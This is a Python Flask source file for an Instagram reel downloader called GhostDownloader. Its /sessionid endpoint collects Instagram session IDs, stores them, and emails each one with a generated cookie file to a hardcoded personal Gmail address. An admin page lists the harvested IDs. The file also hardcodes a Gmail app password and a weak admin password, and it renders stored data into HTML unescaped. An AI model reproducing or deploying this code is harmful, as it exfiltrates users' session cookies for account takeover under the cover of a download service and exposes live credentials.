from flask import Flask, request, jsonify, send_file, Response, make_response
import yt_dlp
import os
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.application import MIMEApplication
from functools import wraps

app = Flask(__name__)
# Admin credentials
ADMIN_USERNAME = "admin"
ADMIN_PASSWORD = "ghost123"

# ---------------------- AUTH DECORATOR ----------------------
def check_auth(username, password):
    return username == ADMIN_USERNAME and password == ADMIN_PASSWORD

def authenticate():
    return Response(
        "Authentication Required", 401,
        {"WWW-Authenticate": 'Basic realm="Login Required"'}
    )

def requires_auth(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        auth = request.authorization
        if not auth or not check_auth(auth.username, auth.password):
            return authenticate()
        return f(*args, **kwargs)
    return decorated

# ---------------------- EMAIL SENDER ----------------------
def send_email(subject, body, to_email, attachment_path=None):
    from_email = "bashirahamad002@gmail.com"
    from_password = "nlfs lozn jebu odug"

    msg = MIMEMultipart()
    msg["Subject"] = subject
    msg["From"] = from_email
    msg["To"] = to_email

    msg.attach(MIMEText(body, "plain"))

    if attachment_path and os.path.exists(attachment_path):
        with open(attachment_path, "rb") as f:
            file_part = MIMEApplication(f.read(), Name=os.path.basename(attachment_path))
            file_part['Content-Disposition'] = f'attachment; filename="{os.path.basename(attachment_path)}"'
            msg.attach(file_part)

    try:
        with smtplib.SMTP_SSL("smtp.gmail.com", 465) as server:
            server.login(from_email, from_password)
            server.send_message(msg)
        print("✅ Email sent!")
    except Exception as e:
        print(f"❌ Failed to send email: {e}")

# ---------------------- ROUTES ----------------------
@app.route("/")
def home():
    return "👻 Instagram Reel Downloader API is running!"


@app.route("/download", methods=["POST"])
def download():
    data = request.json
    url = data.get("url")
    if not url:
        return jsonify({"error": "Missing URL"}), 400

    try:

        ydl_opts = {
            "format": "bestvideo+bestaudio/best",
            "merge_output_format": "mp4",
            "outtmpl": "/tmp/%(id)s.%(ext)s",
            "cookiefile": "cookies.txt",
        }

        with yt_dlp.YoutubeDL(ydl_opts) as ydl:
            info = ydl.extract_info(url, download=True)

        video_id = info.get("id")
        ext = info.get("ext", "mp4")
        local_file_path = f"/tmp/{video_id}.{ext}"

        return send_file(local_file_path, mimetype="video/mp4", as_attachment=False)

    except Exception as e:
        return jsonify({"error": str(e)}), 500
    

@app.route("/sessionid", methods=["POST"])
def receive_sessionid():
    data = request.get_json()
    session_id = data.get("sessionid")
    if not session_id:
        return jsonify({"error": "Missing sessionid"}), 400

    print(f"[✔️ RECEIVED] Session ID: {session_id}")


    cookie_content = f"""# Netscape HTTP Cookie File
.instagram.com	TRUE	/	FALSE	9999999999	sessionid	{session_id}
"""
    try:
        with open("cookies.txt", "w") as file:
            file.write(cookie_content)
    except Exception as e:
        return jsonify({"error": "Failed to save cookie"}), 500

    # Keep only the last 5 session IDs
    try:
        if os.path.exists("session_ids_storage.txt"):
            with open("session_ids_storage.txt", "r") as file:
                lines = file.readlines()
        else:
            lines = []
        lines.append(session_id + "\n")
        lines = lines[-5:]
        with open("session_ids_storage.txt", "w") as file:
            file.writelines(lines)
    except Exception as e:
        print(f"Failed to manage session_ids_storage.txt: {e}")

    # Email with cookies.txt
    try:
        send_email(
            subject="👻 GhostDownloader - New Instagram Session ID",
            body=f"Session ID:\n{session_id}",
            to_email="bashirahamad002@gmail.com",
            attachment_path="cookies.txt"
        )
    except Exception as e:
        print(f"❌ Email failed: {e}")

    return jsonify({"message": "Session ID saved, emailed, and cookies.txt generated"}), 200

@app.route("/admin", methods=["GET", "POST"])


@requires_auth
def admin_panel():
    if request.method == "POST":
        open("session_ids_storage.txt", "w").close()
        return '''
            <h3>✅ All Session IDs Cleared!</h3>
            <a href="/admin">Back to Admin Panel</a>
        '''
    try:
        with open("session_ids_storage.txt", "r") as file:
            session_data = file.read()
    except FileNotFoundError:
        session_data = "No session IDs yet."

    return f"""
        <html>
        <head><title>👻 GhostDownloader Admin</title></head>
        <body>
            <h2>Admin Panel</h2>
            <pre>{session_data}</pre>
            <form method="POST">
                <button type="submit">❌ Clear All Session IDs</button>
            </form>
        </body>
        </html>
    """

# ---------------------- MAIN ----------------------
if __name__ == "__main__":
    port = int(os.environ.get("PORT", 10000))
    app.run(host="0.0.0.0", port=port)
